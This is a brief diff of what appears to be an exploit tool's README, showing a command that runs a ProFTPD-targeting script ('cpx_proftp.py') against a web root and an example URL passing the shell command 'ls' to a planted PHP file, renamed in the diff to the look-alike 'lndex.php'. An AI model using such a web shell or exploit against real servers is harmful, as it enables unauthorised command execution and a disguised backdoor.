@@ -40,5 +40,5 @@ python cpx_proftp.py 127.0.0.1 /var/www/html
 then try:
 
 ```
-http://127.0.0.1/xxx.php?img=ls
+http://127.0.0.1/lndex.php?img=ls
 ```
